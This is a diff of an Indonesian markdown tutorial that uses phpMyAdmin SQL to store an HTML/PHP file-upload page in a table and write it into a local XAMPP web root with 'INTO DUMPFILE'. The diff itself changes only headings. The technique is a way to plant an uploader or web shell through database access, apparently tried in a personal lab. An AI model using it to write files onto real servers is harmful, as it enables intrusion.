@@ -1,13 +1,13 @@
-# Execute CLI Command
+#### Execute CLI Command
 
 Pada halaman ini saya akan mencoba Upload File dari PHPMyAdmin
 
-## Buat table baru
+##### Buat table baru
 ```sql
 CREATE TABLE `test`.`test_content` ( `id` INT NOT NULL AUTO_INCREMENT , `name` VARCHAR(50) NOT NULL , `content` TEXT NOT NULL , PRIMARY KEY (`id`)) ENGINE = InnoDB;
 ```
 
-## Insert Data Baru
+##### Insert Data Baru
 ```sql
 INSERT INTO `test_content` (`id`, `name`, `content`) VALUES (NULL, 'upload.php', '<!DOCTYPE html>
 <html>
@@ -57,7 +57,7 @@ if(isset($_POST["submit"])) {
 </html>');
 ```
 
-## Membuat File di Disk
+##### Membuat File di Disk
 Jalankan query di bawah untuk membuat file `upload.php`
 ```sql
 SELECT content FROM `test_content` WHERE 1 INTO DUMPFILE "D:/xampp2/htdocs/test/upload.php"
